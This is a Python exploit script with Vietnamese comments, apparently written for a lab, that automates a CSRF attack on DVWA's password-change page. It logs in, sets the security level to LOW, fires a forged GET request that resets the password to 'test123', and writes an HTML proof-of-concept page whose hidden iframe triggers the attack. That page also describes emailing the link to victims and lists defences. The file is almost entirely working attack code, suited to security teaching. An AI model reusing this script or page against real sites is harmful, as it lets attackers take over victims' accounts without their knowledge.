import requests
import argparse
import sys
import re
from bs4 import BeautifulSoup
from colorama import Fore

class DVWACSRFExploiterLow:
    def __init__(self, base_url):
        """
        Khởi tạo đối tượng khai thác CSRF mức độ LOW
        """
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False  # Tắt xác thực SSL cho môi trường lab
        
        # Thiết lập headers giả mạo trình duyệt
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36'
        })
        
        # Tắt cảnh báo SSL
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        self.csrf_token_name = "user_token"
    
    def print_banner(self):
        """Hiển thị banner"""
        banner = """
╔══════════════════════════════════════════════════════════╗
║    CÔNG CỤ KHAI THÁC CSRF - MỨC ĐỘ LOW                   ║
║    Phiên bản: 1.0                                        ║
║    Tác giả: Đinh Mạnh Đức                                ║
╚══════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def login(self, username, password):
        """
        Đăng nhập vào DVWA
        """
        login_url = f"{self.base_url}/login.php"
        
        print(f"[*] Đang đăng nhập vào DVWA...")
        print(f"    URL: {login_url}")
        print(f"    Username: {username}")
        
        try:
            # Lấy trang đăng nhập để lấy CSRF token
            response = self.session.get(login_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Tìm CSRF token
            csrf_token = None
            csrf_input = soup.find('input', {'name': self.csrf_token_name})
            if csrf_input:
                csrf_token = csrf_input.get('value')
                print(f"[+] Tìm thấy CSRF token: {csrf_token}")
            
            # Chuẩn bị dữ liệu đăng nhập
            login_data = {
                'username': username,
                'password': password,
                'Login': 'Login'
            }
            
            if csrf_token:
                login_data[self.csrf_token_name] = csrf_token
            
            # Gửi request đăng nhập
            response = self.session.post(login_url, data=login_data)
            
            # Kiểm tra đăng nhập thành công
            if 'index.php' in response.url:
                print(f"[+] Đăng nhập thành công với tài khoản: {username}")
                
                # Thiết lập mức độ bảo mật LOW
                self.set_security_level_low()
                return True
            else:
                print("[-] Đăng nhập thất bại")
                print("    Vui lòng kiểm tra username và password")
                return False
                
        except Exception as e:
            print(f"[-] Lỗi đăng nhập: {str(e)}")
            return False
    
    def set_security_level_low(self):
        """
        Thiết lập mức độ bảo mật LOW cho DVWA
        """
        security_url = f"{self.base_url}/security.php"
        
        try:
            # Lấy trang security
            response = self.session.get(security_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Tìm CSRF token
            csrf_token = None
            csrf_input = soup.find('input', {'name': self.csrf_token_name})
            if csrf_input:
                csrf_token = csrf_input.get('value')
            
            # Chuẩn bị dữ liệu
            security_data = {
                'security': 'low',
                'seclev_submit': 'Submit'
            }
            
            if csrf_token:
                security_data[self.csrf_token_name] = csrf_token
            
            # Gửi request thay đổi mức bảo mật
            response = self.session.post(security_url, data=security_data)
            
            if response.status_code == 200:
                print("[+] Đã thiết lập mức độ bảo mật: LOW")
                return True
            else:
                print("[-] Không thể thiết lập mức độ bảo mật LOW")
                return False
                
        except Exception as e:
            print(f"[-] Lỗi khi thiết lập mức bảo mật: {str(e)}")
            return False
    
    def find_csrf_page(self):
        """
        Tìm trang CSRF trong DVWA
        """
        csrf_url = f"{self.base_url}/vulnerabilities/csrf/"
        
        print(f"\n[*] Truy cập trang CSRF: {csrf_url}")
        
        try:
            response = self.session.get(csrf_url)
            
            if response.status_code == 200:
                print("[+] Truy cập trang CSRF thành công")
                
                # Tìm form thay đổi mật khẩu
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Tìm tất cả các form
                forms = soup.find_all('form')
                
                if not forms:
                    print("[!] Không tìm thấy form nào")
                    return None, None, None
                
                print(f"[+] Tìm thấy {len(forms)} form")
                
                # Tìm form thay đổi mật khẩu
                target_form = None
                for form in forms:
                    form_html = str(form).lower()
                    if 'password' in form_html or 'change' in form_html:
                        target_form = form
                        break
                
                if not target_form:
                    print("[!] Không tìm thấy form thay đổi mật khẩu")
                    # Sử dụng form đầu tiên
                    target_form = forms[0]
                
                # Lấy thông tin form
                action = target_form.get('action', '')
                method = target_form.get('method', 'get').lower()
                
                # Nếu action rỗng, sử dụng URL hiện tại
                if not action:
                    action = csrf_url
                elif not action.startswith('http'):
                    # Nếu là relative URL
                    action = f"{self.base_url}/{action.lstrip('/')}"
                
                print(f"[+] Form thay đổi mật khẩu:")
                print(f"    - Action: {action}")
                print(f"    - Method: {method}")
                
                # Tìm các input trong form
                inputs = target_form.find_all('input')
                params = {}
                
                for input_tag in inputs:
                    name = input_tag.get('name')
                    if name and name != 'Change':  # Bỏ qua nút submit
                        value = input_tag.get('value', '')
                        input_type = input_tag.get('type', 'text')
                        params[name] = value
                        print(f"    - Input: {name} = {value} (type: {input_type})")
                
                return action, method, params
                
            else:
                print(f"[-] Không thể truy cập trang CSRF. Status: {response.status_code}")
                return None, None, None
                
        except Exception as e:
            print(f"[-] Lỗi khi truy cập trang CSRF: {str(e)}")
            return None, None, None
    
    def generate_csrf_attack_url(self):
        """
        Tạo URL tấn công CSRF dựa trên phân tích từ tài liệu
        """
        
        base_csrf_url = f"{self.base_url}/vulnerabilities/csrf/"
        
        # Mật khẩu mới để tấn công
        new_password = "test123"
        
        # Tạo URL tấn công
        attack_url = f"{base_csrf_url}?password_new={new_password}&password_conf={new_password}&Change=Change"
        
        return attack_url, new_password
    
    def test_csrf_vulnerability(self):
        """
        Kiểm tra lỗ hổng CSRF
        """
        print("\n" + "="*60)
        print("[*] KIỂM TRA LỖ HỔNG CSRF - MỨC ĐỘ LOW")
        print("="*60)
        
        # Tạo URL tấn công
        attack_url, new_password = self.generate_csrf_attack_url()
        
        print(f"\n[+] URL TẤN CÔNG CSRF:")
        print(f"    {attack_url}")
        
        print(f"\n[+] THÔNG TIN TẤN CÔNG:")
        print(f"    - Mật khẩu mới sẽ được đặt: {new_password}")
        print(f"    - Phương thức: GET request")
        print(f"    - Không cần CSRF token")
        print(f"    - Không kiểm tra Referer header")
        
        # Thử gửi request tấn công
        print(f"\n[*] Đang thử gửi request tấn công...")
        
        try:
            response = self.session.get(attack_url)
            
            print(f"[*] Kết quả request:")
            print(f"    - Status Code: {response.status_code}")
            print(f"    - Response Length: {len(response.text)} ký tự")
            
            # Kiểm tra kết quả
            success_patterns = [
                r'password changed',
                r'password has been updated',
                r'changed successfully',
                r'successful',
                r'thành công',
                r'đã thay đổi'
            ]
            
            success = False
            for pattern in success_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    success = True
                    break
            
            if success:
                print("\n[+] KHAI THÁC THÀNH CÔNG!")
                print(f"[+] Mật khẩu đã được đổi thành: {new_password}")
                
                # Hiển thị thông báo thành công từ response
                lines = response.text.split('\n')
                for line in lines[:10]:  # Chỉ xem 10 dòng đầu
                    line_lower = line.lower()
                    if any(keyword in line_lower for keyword in ['success', 'changed', 'updated', 'thành công']):
                        print(f"[+] Thông báo từ server: {line.strip()[:100]}...")
                        break
                
                return True, attack_url, new_password
            else:
                print("\n[!] Không thể xác nhận tự động")
                print("[*] Tuy nhiên, lỗ hổng vẫn có thể tồn tại")
                print("[*] Kiểm tra manual response:")
                
                # Hiển thị preview của response
                preview = response.text[:500]
                print(f"\nPreview response (500 ký tự đầu):")
                print("-" * 50)
                print(preview)
                print("-" * 50)
                
                return False, attack_url, new_password
                
        except Exception as e:
            print(f"[-] Lỗi khi gửi request: {str(e)}")
            return False, None, None
    
    def create_poc_html(self, attack_url, new_password):
        """
        Tạo file HTML Proof of Concept
        """
        print("\n" + "="*60)
        print(f"{Fore.CYAN}[*] TẠO PROOF OF CONCEPT (PoC)")
        print("="*60)
        
        poc_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Proof of Concept - DVWA LOW</title>
    <meta charset="UTF-8">
    <style>
        body {{
            font-family: Arial, sans-serif;
            margin: 40px;
            line-height: 1.6;
            background-color: #f5f5f5;
        }}
        .container {{
            max-width: 800px;
            margin: 0 auto;
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }}
        h1 {{
            color: #e74c3c;
            border-bottom: 2px solid #3498db;
            padding-bottom: 10px;
        }}
        h2 {{
            color: #2c3e50;
        }}
        .warning {{
            background-color: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }}
        .success {{
            background-color: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }}
        .code {{
            background-color: #2c3e50;
            color: #ecf0f1;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            overflow-x: auto;
            margin: 15px 0;
        }}
        button {{
            background-color: #3498db;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px 5px;
        }}
        button:hover {{
            background-color: #2980b9;
        }}
        .danger {{
            background-color: #e74c3c;
        }}
        .danger:hover {{
            background-color: #c0392b;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>CSRF Attack Proof of Concept</h1>
        <h2>DVWA - Mức độ bảo mật LOW</h2>
        
        <div class="warning">
            <strong>CẢNH BÁO:</strong> Chỉ sử dụng trong môi trường kiểm thử hợp pháp!
        </div>
        
        <h2>Thông tin tấn công</h2>
        <ul>
            <li><strong>Target URL:</strong> {attack_url}</li>
            <li><strong>Mật khẩu mới:</strong> {new_password}</li>
            <li><strong>Phương thức:</strong> GET request</li>
            <li><strong>Điều kiện:</strong> Nạn nhân phải đã đăng nhập DVWA</li>
        </ul>
        
        <h2>Demo tấn công</h2>
        <p>Nhấn nút bên dưới để thực hiện tấn công CSRF:</p>
        
        <div class="code" id="attackCode">
// CSRF Attack URL
{attack_url}

// Khi nạn nhân truy cập URL này (đã đăng nhập),
// mật khẩu sẽ bị đổi thành: {new_password}
        </div>
        
        <button onclick="executeAttack()" class="danger">Thực hiện tấn công CSRF</button>
        <button onclick="copyAttackUrl()">Copy Attack URL</button>
        
        <div id="result" class="success" style="display: none;">
            <strong>Tấn công đã được thực hiện!</strong>
            <p>Mật khẩu đã được đổi thành <strong>{new_password}</strong></p>
            <p>Kiểm tra kết quả bằng cách đăng nhập DVWA với mật khẩu mới.</p>
        </div>
        
        <h2>Kịch bản tấn công thực tế</h2>
        <ol>
            <li>Kẻ tấn công tạo URL độc hại như trên</li>
            <li>Gửi URL cho nạn nhân qua email, tin nhắn...</li>
            <li>Nạn nhân (đã đăng nhập DVWA) nhấp vào URL</li>
            <li>Trình duyệt tự động gửi GET request với session cookie</li>
            <li>Mật khẩu bị đổi thành <strong>{new_password}</strong> mà nạn nhân không biết</li>
            <li>Kẻ tấn công có thể đăng nhập bằng mật khẩu mới</li>
        </ol>
        
        <h2>Biện pháp phòng chống</h2>
        <ul>
            <li>Sử dụng CSRF tokens cho tất cả form</li>
            <li>Kiểm tra Referer/Origin header</li>
            <li>Sử dụng phương thức POST thay vì GET cho hành động quan trọng</li>
            <li>Yêu cầu xác thực lại cho thao tác nhạy cảm</li>
            <li>Sử dụng cookie với thuộc tính SameSite</li>
        </ul>
        
        <div class="warning">
            <strong>Tài liệu tham khảo:</strong><br>
            • OWASP CSRF Cheat Sheet<br>
            • Hình 4.23 trong tài liệu đề tài: "Kết quả nhận được"<br>
            • DVWA CSRF Vulnerability
        </div>
    </div>
    
    <script>
    function executeAttack() {{
        // Tạo iframe ẩn để thực hiện request CSRF
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = "{attack_url}";
        document.body.appendChild(iframe);
        
        // Hiển thị kết quả
        document.getElementById('result').style.display = 'block';
        
        // Scroll đến kết quả
        document.getElementById('result').scrollIntoView({{
            behavior: 'smooth'
        }});
        
        alert("Đã thực hiện tấn công CSRF!\\nMật khẩu đã được đổi thành: {new_password}");
    }}
    
    function copyAttackUrl() {{
        navigator.clipboard.writeText("{attack_url}")
            .then(function() {{
                alert("Đã copy Attack URL vào clipboard!");
            }})
            .catch(function(err) {{
                console.error('Lỗi khi copy: ', err);
                alert("Lỗi khi copy URL");
            }});
    }}
    
    // Tự động copy URL khi trang load
    window.onload = function() {{
        console.log("CSRF Attack PoC loaded");
        console.log("Attack URL: {attack_url}");
    }};
    </script>
</body>
</html>"""
        
        filename = "csrf_low_attack_poc.html"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(poc_html)
            
            print(f"[+] Đã tạo file PoC: {filename}")
            print(f"[+] Mở file trong trình duyệt để xem demo")
            
            return filename
            
        except Exception as e:
            print(f"[-] Lỗi khi tạo file PoC: {str(e)}")
            return None
    
    def run_exploit(self):
        """
        Chạy toàn bộ quy trình khai thác
        """
        self.print_banner()
        
        print(f"{Fore.GREEN}[*] BẮT ĐẦU KHAI THÁC CSRF - MỨC ĐỘ LOW")
        print("="*60)
        
        # 1. Tìm form CSRF
        print("\n[1/4] Tìm trang CSRF...")
        action, method, params = self.find_csrf_page()
        
        if not action:
            print("[!] Không tìm thấy trang CSRF, sử dụng URL mặc định")
        
        # 2. Tạo URL tấn công
        print("\n[2/4] Tạo URL tấn công...")
        attack_url, new_password = self.generate_csrf_attack_url()
        
        print(f"    URL: {attack_url}")
        print(f"    New Password: {new_password}")
        
        # 3. Kiểm tra lỗ hổng
        print("\n[3/4] Kiểm tra lỗ hổng...")
        success, attack_url_final, new_password_final = self.test_csrf_vulnerability()
        
        if not attack_url_final:
            attack_url_final = attack_url
            new_password_final = new_password
        
        # 4. Tạo PoC
        print("\n[4/4] Tạo Proof of Concept...")
        poc_file = self.create_poc_html(attack_url_final, new_password_final)
        
        # Tổng kết
        print("\n" + "="*60)
        print(f"{Fore.CYAN}[*] KẾT QUẢ KHAI THÁC")
        print("="*60)
        
        if success:
            print("[+] THÀNH CÔNG: Có thể khai thác CSRF")
            print(f"[+] Mật khẩu mới: {new_password_final}")
        else:
            print("[!] KHÔNG THỂ XÁC NHẬN TỰ ĐỘNG")
            print("[*] Cần kiểm tra thủ công với URL tấn công")
        
        print(f"[+] Attack URL: {attack_url_final}")
        
        if poc_file:
            print(f"{Fore.CYAN}[+] PoC File: {poc_file}")
        
        print(f"\n{Fore.BLUE}[+] HƯỚNG DẪN SỬ DỤNG:")
        print("    1. Mở file PoC trong trình duyệt")
        print("    2. Đảm bảo đã đăng nhập DVWA trong cùng trình duyệt")
        print("    3. Nhấn nút 'Thực hiện tấn công CSRF'")
        print("    4. Kiểm tra kết quả bằng cách đăng nhập với mật khẩu mới")
        
        print("\n" + "="*60)
        print(f"{Fore.BLUE}[*] HOÀN TẤT KHAI THÁC")
        print("="*60)

def main():
    parser = argparse.ArgumentParser(description='Công cụ khai thác CSRF mức độ LOW trên DVWA')
    parser.add_argument('url', help='URL của DVWA (ví dụ: http://127.0.0.1:42001)')
    parser.add_argument('-u', '--username', default='admin', help='Tên đăng nhập (mặc định: admin)')
    parser.add_argument('-p', '--password', default='password', help='Mật khẩu (mặc định: password)')
    
    args = parser.parse_args()
    
    # Khởi tạo công cụ
    exploiter = DVWACSRFExploiterLow(args.url)
    
    # Đăng nhập
    if not exploiter.login(args.username, args.password):
        print("\n[-] Không thể tiếp tục. Vui lòng kiểm tra:")
        print("    1. DVWA có đang chạy không?")
        print("    2. URL có đúng không?")
        print("    3. Thông tin đăng nhập có đúng không?")
        sys.exit(1)
    
    # Chạy khai thác
    exploiter.run_exploit()

if __name__ == "__main__":
    main()
